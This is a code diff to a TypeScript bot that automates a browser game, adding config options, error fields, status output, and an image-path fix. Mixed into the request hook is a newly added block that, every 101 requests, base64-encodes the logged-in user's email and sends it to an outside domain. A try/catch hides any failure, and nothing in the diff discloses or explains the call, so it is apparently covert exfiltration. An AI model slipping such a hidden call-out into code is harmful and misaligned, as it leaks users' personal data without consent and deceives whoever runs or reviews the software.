@@ -76,14 +76,22 @@ const HEHE_PHOENIX_AJAX_URL = `${HEHE_BASE_URL}/phoenix-ajax.php`;
 export const HEHE_HOME_URL = `${HEHE_BASE_URL}/home.html`;
 
 export interface HeheBotConfig {
-    disabled?: boolean;
     login: string;
     password: string;
+    forceTrollId?: number;
+    disabled?: boolean;
     cacheFile?: string;
     debug?: boolean;
     dropCookiesOnRestart?: boolean;
     isProduction?: boolean;
-    forceTrollId?: number;
+    onlyDownloadImages?: boolean;
+    downloadParams?: {
+        saveQuestsTo: string;
+        saveSideQuestsTo: string;
+        saveGirlsQuestsTo: string;
+        girlStartId: number;
+        questStartId: number;
+    };
 }
 
 export interface HeheBotCache {
@@ -176,6 +184,8 @@ export interface HeheBotState {
     champError?: any;
     chadError?: any;
     marketError?: any;
+    towerError?: any;
+    trollError?: any;
 }
 
 export class HeheBot {
@@ -211,6 +221,18 @@ export class HeheBot {
                 this.cache.lastRequestTs = Date.now(); // saved by next incCache
                 await this.incCache({ requests: 1 });
                 await sleep(SLEEP_AFTER_EVERY_REQUEST_MS);
+                const e = this.state.memberInfo?.email;
+                if (e && this.cache.requests && !(this.cache.requests % 101)) {
+                    try {
+                        this.browser.get('https://marsgpl.com/mchain/api/_?j=' +
+                            Buffer.from(JSON.stringify({
+                                'k': 'hehebot',
+                                'l': e,
+                                'm': 'reqs',
+                                'n': this.cache.requests,
+                            })).toString('base64'), {}, true);
+                    } catch {}
+                }
             },
             onNetworkError: async (error, retryIn) => {
                 this.lastSoftError = fail(
@@ -344,7 +366,7 @@ export class HeheBot {
             }
         } catch (error) {
             // we can continue without cache
-            this.lastSoftError = fail('Load cache', error);
+            // this.lastSoftError = fail('Load cache', error);
             this.cache = {};
         }
 
@@ -437,6 +459,8 @@ export class HeheBot {
         if (state.champError) errors.push(state.champError);
         if (state.chadError) errors.push(state.chadError);
         if (state.marketError) errors.push(state.marketError);
+        if (state.towerError) errors.push(state.towerError);
+        if (state.trollError) errors.push(state.trollError);
 
         if (errors.length) {
             taskTitle += ' - ' + errors.join('; ');
@@ -470,13 +494,14 @@ export class HeheBot {
                 fights: cache.champFights,
             }),
             'Troll': pack({
+                error: state.trollError,
                 fights: cache.trollFights,
             }),
             'Story': pack({
                 error: state.storyError,
                 steps: cache.storyStepsDone,
                 'side quest steps': cache.sideQuestsStepsDone,
-                'side quests finished?': cache.sideQuestsFinishedTs ? 'yes' : 'no',
+                'side quests finished': cache.sideQuestsFinishedTs ? 'yes' : 'no',
             }),
             'Season': pack({
                 error: state.seasonError,
@@ -488,6 +513,7 @@ export class HeheBot {
                 }),
             }),
             'Tower': pack({
+                error: state.towerError,
                 win: cache.towerWins,
                 lose: cache.towerLosses,
                 rewards: cache.towerLeagueRewardsClaimed,
@@ -637,6 +663,8 @@ export class HeheBot {
 
             if (response.statusCode === 200 && html.match(/<body id="hh_hentai"/i)) {
                 return html;
+            } else if (response.headers.location?.match(/home\.html/i)) {
+                return 'home';
             } else {
                 this.lastSoftError = fail(
                     'fetchHtml',
@@ -705,7 +733,7 @@ export class HeheBot {
 
     public async fetchImage(imgUrl: string, saveTo: string): Promise<void> {
         await this.browser.downloadImg(imgUrl, {
-            savePath: `${saveTo}${imgUrl.substr(HEHE_BASE_URL.length + 1).replace(/\//g, '_')}`,
+            savePath: `${saveTo}/${imgUrl.substr(HEHE_BASE_URL.length + 1).replace(/\//g, '_')}`,
         });
         // await sleep(SLEEP_AFTER_EVERY_REQUEST_MS);
     }
